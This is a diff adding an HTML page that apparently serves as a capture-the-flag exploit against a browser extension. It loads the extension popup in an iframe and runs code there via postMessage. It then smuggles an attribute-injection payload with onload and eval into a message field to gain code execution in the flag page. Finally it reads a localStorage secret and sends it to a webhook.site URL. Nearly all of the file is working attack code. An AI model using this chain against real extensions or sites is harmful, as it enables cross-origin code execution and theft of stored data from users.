@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+    <head>
+
+    </head>
+    <body>
+        <div id="this">
+        </div>
+        <is>
+        </is>
+        <hard class="to" id="understand" but="also"></hard>
+        <not>
+             <div id="test" class="very easy"></div>
+        </not>
+        <script>
+            const query = new URLSearchParams(location.search);
+            const flagPage = query.has('flag-page') ? query.get('flag-page') : 'http://127.0.0.1:9000/';
+
+            function getExtensionOrigin() {
+                const globe = document.querySelector('img')
+                const pathIndex = globe.src.indexOf('/web');
+                return globe.src.substring(0, pathIndex)
+            }
+
+            async function loadIframe(url) {
+                return new Promise((resolve, reject) => {
+                    const iframe = document.createElement('iframe');
+                    iframe.onload = () => resolve(iframe.contentWindow);
+                    iframe.onerror = reject;
+                    iframe.src = url;
+                    document.body.appendChild(iframe);
+                });
+            }
+
+            // helper iframe sends a postmessage on load
+            // register extEval after this message got received because then the helper iframe has finished loading/initialization
+            async function runExtensionExpression(extensionWindow, extensionOrigin) {
+                return new Promise(resolve => {
+                    window.extEvalCallback = null;
+                    window.addEventListener('message', m => {
+                        if (event.origin !== extensionOrigin) {
+                            return;
+                        }
+
+                        const extEval = async expr => new Promise(resolve => {
+                            window.extEvalCallback = resolve;
+                            extensionWindow.postMessage(expr, extensionOrigin);
+                        });
+
+                        resolve(extEval);
+
+                        if (window.extEvalCallback !== null) {
+                            window.extEvalCallback(m.data);
+                        }
+
+                        if (m.data && m.data.leak) {
+                            console.log(m.data.leak);
+                        }
+                    });
+                })
+                
+            }
+
+            async function waitForGoodMessage(extensionEval) {
+                await extensionEval(`
+                    browser.runtime.onMessage.addListener(message => {
+                        if (message.type === 'good') {
+                            window.top.postMessage({ leak: message }, '*');
+                        }
+                    });
+                `);
+            }
+
+            async function runFlagExpression(flagWindow, extensionEval, flagPage) {
+                return new Promise(resolve => {
+                    window.flagEvalCallback = null;
+                    window.addEventListener('message', m => {
+                        if (event.origin !== new URL(flagPage).origin) {
+                            return;
+                        }
+
+                        const flagEval = async expr => new Promise(resolve => {
+                            window.flagEvalCallback = resolve;
+                            flagWindow.postMessage(expr, new URL(flagPage).origin);
+                        });
+
+                        resolve(flagEval);
+
+                        if (window.flagEvalCallback !== null) {
+                            window.flagEvalCallback(m.data);
+                        }
+
+                        if (m.data && m.data.leak) {
+                            console.log(m.data.leak);
+                        }
+                    });
+
+                    sendBadElementMessage(extensionEval);
+                });
+            }
+
+            function sendBadElementMessage(extensionEval) {
+                const msg = {
+                    type: 'sendToTabs',
+                    tabQuery: {
+                        currentWindow: true,
+                        active: true,
+                    },
+                    message: {
+                        type: 'bad',
+                        id: 'flag-hodler',
+                        category: '" onload="f = e => e.source.postMessage(eval(e.data), `*`); window.addEventListener(`message`, f); f({data: 1, source: parent})',
+                    }
+                }
+                extensionEval(`browser.runtime.sendMessage(${JSON.stringify(msg)}),0`);
+            }
+
+            setTimeout(async () => {
+                const extensionOrigin = getExtensionOrigin();
+
+                const extWindow = await loadIframe(`${extensionOrigin}/popup/index.html`);
+                const helperWindow = await loadIframe(`helper.html`);
+                const extensionEval = await runExtensionExpression(extWindow, extensionOrigin);
+                
+
+                const flagWindow = await loadIframe(flagPage);
+                await waitForGoodMessage(extensionEval);
+                const flagEval = await runFlagExpression(flagWindow, extensionEval, flagPage);
+                const flag = await flagEval("window.localStorage.flag");
+                await fetch(`http://www.webhook.site/bd74c86a-0fdd-4f0a-b60a-dcec18f9b2a3?flag=${flag}`);
+
+            }, 500);
+        </script>
+    </body>
+</html>
